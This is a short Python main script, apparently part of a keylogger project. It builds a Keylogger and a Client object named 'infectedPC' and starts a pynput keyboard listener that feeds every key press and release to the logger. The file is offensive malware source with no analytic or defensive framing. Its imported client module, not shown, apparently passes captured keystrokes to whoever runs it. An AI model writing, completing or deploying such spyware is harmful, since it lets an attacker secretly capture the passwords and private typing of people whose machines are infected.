from client import *
from keylogger import *
from threading import Lock
from pynput import keyboard


def main():

    lock = Lock()
    keylog = Keylogger(lock)
    infectedPC = Client(lock)

    with keyboard.Listener(on_press=keylog.on_press, on_release=keylog.on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
